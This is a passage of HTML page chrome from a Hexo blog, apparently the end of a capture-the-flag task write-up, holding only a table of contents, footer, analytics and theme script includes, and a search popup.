class="nav-link" href="#TASK-6"><span class="nav-number">6.</span> <span class="nav-text">TASK 6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-7"><span class="nav-number">7.</span> <span class="nav-text">TASK 7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-8"><span class="nav-number">8.</span> <span class="nav-text">TASK 8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TASK-9"><span class="nav-number">9.</span> <span class="nav-text">TASK 9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUBMIT-FLAG"><span class="nav-number">10.</span> <span class="nav-text">SUBMIT FLAG</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JiZItHVhLKBShkL0/quote.js?theme=#1690FF,#333333,#999999,#333333,#FFFFFF,#1690FF,18&f=18&display=0,0,1,1,0,1,1,1"></script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>